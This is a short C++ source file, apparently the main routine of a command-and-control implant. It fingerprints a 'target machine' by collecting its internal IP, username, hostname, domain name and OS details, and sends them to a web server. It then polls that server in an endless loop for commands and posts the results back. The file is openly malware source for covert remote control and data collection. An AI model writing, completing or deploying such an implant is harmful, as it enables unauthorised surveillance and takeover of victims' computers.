#include "headers/require.h"
#include "headers/os_information.h"
#include "headers/connection_handler.h"

int main(int argc, char* argv[])
{
    /*
        FIX: We should get exact information about domain name
    */
    std::string uuid_target_id = http::uuid_as_id();
    std::string internal_ip_address = get_ip_internal();
    std::string computer_name = get_domainname();
    std::string hostname = get_hostname();
    std::string username = get_username();
    std::string os = os_information();

    /*
        All target machine information formated before send to websever
    */
    std::string all_information = 
        "id=" + uuid_target_id + 
        "^internal_ip=" + internal_ip_address + 
        "^user_name=" + username + 
        "^host_name=" + hostname + 
        "^arch=" + os + 
        "^domain_name=" + computer_name;

    /*
        CURL initialized with data
    */
    http::init(all_information);

    /*
        Send and Response handle here
    */
    while (true)
    {
        auto response = http::get(uuid_target_id);
        if (!response.empty())
            http::post_response(response, uuid_target_id);
        else
            continue;

        Sleep(10000);
    }

    /*
        Final of the Program
    */
	return 0;
}